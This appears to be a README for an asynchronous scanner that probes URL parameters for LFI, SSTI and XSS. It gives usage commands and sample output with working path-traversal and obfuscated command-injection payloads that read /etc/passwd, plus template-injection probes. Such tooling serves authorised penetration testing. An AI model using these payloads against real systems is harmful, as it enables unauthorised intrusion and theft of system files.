
# Asynchronous Vulnerability Scanner

---

## Description
### A program for searching for vulnerabilities in links such as LFI, SSTI, XSS

---

## Install:
```pycon
git clone 
cd AVScaner_Link
```
```pycon
1. Create a virtual environment:
    python -m venv .venv

2. Activate the virtual environment:
    On Windows:
    .venv\Scripts\activate
    
    On macOS/Linux:
    source .venv/bin/activate

pip install -r requirements.txt
# pip freeze > requirements.txt
```

---

## Preparing links before work:
### Tools:
- [uddup](https://github.com/rotemreiss/uddup)
- [p1radup](https://github.com/iambouali/p1radup)
- [urldedupe](https://github.com/ameenmaali/urldedupe)

```bash
uddup -s -u crawled_link.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" | sort -u | urldedupe -s | grep '=' | sort -u > crawled_final.txt
```
or
```bash
cat crawled_link.txt | grep -vE "\.js(\?|$)" | p1radup | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*"  > crawled_final.txt
```
---

### Use
```text
"-i", "--input", help="Path to the file with links for check"
"-o", "--output", help="Output folder", default="output_report"
"-p", "--payloads", help="Path to file with payloads"
"-a", "--answers", help="Path to file with answers"
"-c", "--concurrency", help="Number of concurrent requests per sec", default=20)
"-t", "--timeout", help="Request timeout", default=15 sec)
"-v", "--verbose", help="Display all responses", default=None)
"-e", "--url_encode", help="Proper URL encoding", default=None)
"-px", "--proxy", help="Proxy for intercepting requests (e.g., http://127.0.0.1:8080)"
```
```pycon
python AVScaner_Link.py -c 20 -e

python AVScaner_Link.py -c 20 -v -e -px http://127.0.0.1:8080

python AVScaner_Link.py -c 20 -v -e -i "input_data/crawled_final.txt" -p "wordlist/payloads_LFI.txt" -a "wordlist/answers_LFI.txt"

python AVScaner_Link.py -c 20 -v -e -i "input_data/crawled_final.txt" -p "wordlist/payloads_SSTI.txt" -a "wordlist/answers_SSTI.txt"
```

### After scanning, check the **report** folder!

---

### LFI

```bash
python AVScaner_Link.py -c 20 -e -px http://127.0.0.1:8080

[*] Starting @ 16:22:55 2024-08-30
[*] Total number of payload variants per link: 36


1/36 🐱  [+] URL: http://testphp.vulnweb.com/product.php?pic=text:/etc/passwd | Status: 200 
2/36 🐭  [+] URL: http://testphp.vulnweb.com/product.php?pic=%7Bcat%2C/etc/passwd%7D | Status: 200 
3/36 🐹  [+] URL: http://testphp.vulnweb.com/product.php?pic=view-source:file:///etc/passwd | Status: 200 
4/36 🐰  [+] URL: http://testphp.vulnweb.com/product.php?pic=/%2A%2A%2A%2A/?at%24IFS/???/%2Aswd | Status: 200 
27/36 🐻  [+] URL: http://testphp.vulnweb.com/product.php?pic=%7B%5Cc%27%27%5Ca%22%22%5Ct%2C/%5Ce%27%27%2A?/%5Cp%2A%5Cd%7D | Status: 200 
28/36 🐨  [+] URL: http://testphp.vulnweb.com/product.php?pic=IFS=%2C%3B%60cat%3C%3C%3Ccat%2C/etc/passwd%60 | Status: 200 
29/36 🐯  [+] URL: http://testphp.vulnweb.com/product.php?pic=../../../../../etc/passwd | Status: 200 
30/36 🦁  [+] URL: http://testphp.vulnweb.com/product.php?pic=%7B%5Cc%27%27%5Ca%22%22t%2C/e%27%27%2A?/?a?s??%7D | Status: 200 


[*] Finished @ 16:23:49 2024-08-30
[*] Duration: 0:00:53.648854
```


```bash
python AVScaner_Link.py -c 20 -i "input_data/crawled_final.txt" -p "wordlist/payloads_LFI_70466.txt" -a "wordlist/answers_LFI.txt"

140/70466  [+] URL: https://example.com/tools.php?page=./.././.././.././..//etc/passwd | Status: 200 
147/70466  [+] URL: https://example.com/tools.php?page=./.././.././.././.././..//etc/passwd | Status: 200 
153/70466  [+] URL: https://example.com/tools.php?page=./.././.././.././.././.././..//etc/passwd | Status: 200 
282/70466  [+] URL: https://example.com/tools.php?page=.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd | Status: 200 
296/70466  [+] URL: https://example.com/tools.php?page=.//..//.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd | Status: 200 
303/70466  [+] URL: https://example.com/tools.php?page=.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd | Status: 200 
347/70466  [+] URL: https://example.com/tools.php?page=../../../../../../../../../../../../etc/passwd | Status: 200 
392/70466  [+] URL: https://example.com/tools.php?page=/../../../../../../../../../../etc/passwd | Status: 200 
```

### SSTI
```bash
python AVScaner_Link.py -c 20 -v -e -i "input_data/crawled_final.txt" -p "wordlist/payloads_SSTI.txt" -a "wordlist/answers_SSTI.txt"

[*] Starting @ 00:28:22 2024-08-30
[*] Total number of payload variants per link: 14


1/14  [-] URL: https://example.com/tools.php?page=check-ssti%5B%5B%24%7B7%2A7%7D%5D%5D | Status: 200 
2/14  [-] URL: https://example.com/tools.php?page=check-ssti%7B%7B7%2A7%7D%7D | Status: 200
3/14  [-] URL: https://example.com/tools.php?page=check-ssti%3C%25=%207%20%2A%207%20%25%3E | Status: 200 
4/14  [-] URL: https://example.com/tools.php?page=check-ssti%7B%7B7%2A%277%27%7D%7D | Status: 200


[*] Finished @ 00:28:22 2024-08-30
[*] Duration: 0:00:00.765637
```

---

## Proxy
####  Windows Subsystem for Linux ([WSL](https://stackoverflow.com/questions/51887784/using-aiohttp-with-proxy/78727608#78727608))

```text
import aiohttp
import ssl

url = 'https://example.com'
proxy_url = 'http://<user>:<pass>@<proxy>:<port>'
path_to_cafile = '/etc/ssl/certs/ca-certificates.crt'
ssl_ctx = ssl.create_default_context(cafile=path_to_cafile)

async with aiohttp.ClientSession() as session:
    async with session.get(url, proxy=proxy_url, ssl=ssl_ctx) 
```